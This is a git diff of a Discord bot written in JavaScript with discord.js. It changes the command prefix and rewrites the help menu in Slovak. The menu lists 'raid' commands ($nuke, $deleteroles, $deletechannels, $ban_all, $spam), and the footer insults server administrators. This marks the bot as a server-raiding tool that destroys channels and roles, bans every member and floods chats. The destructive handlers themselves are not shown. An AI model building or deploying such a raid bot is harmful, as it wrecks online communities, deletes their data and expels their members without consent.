@@ -1,6 +1,6 @@
 const Discord = require('discord.js')
 const bot = new Discord.Client();
-const prefix = '?';
+const prefix = '$';
 
 bot.on('ready', () => {
     console.log(`${bot.user.tag} je to ready!`)
@@ -60,12 +60,12 @@ if(message.content === prefix + 'spam') {
 })
   if(message.content === prefix + 'help') {
   const xhelp = new Discord.RichEmbed()
-  .setTitle("ALL COMMANDS")
-  .addField('Info Commands', '```$info```', true)
-  .addField('Raid Commands', '```$nuke, $deleteroles, $create, $deletechannels, $ban_all```', true)
-  .addField('Other Commands', '```$spam```', true)
-  .setFooter("Thanks for administrator dumbasses")
-  .setColor("RANDOM")
+  .setTitle("COMMANDY KTORE TI PONUKAM")
+  .addField('Info', '```$info```', true)
+  .addField('Bordel', '```$nuke, $deleteroles, $create, $deletechannels, $ban_all```', true)
+  .addField('Ine', '```$spam```', true)
+  .setFooter("Admini su opice :pog: ")
+  .setColor("red")
   message.channel.send(xhelp)
   }
   if(message.content === '$info') {
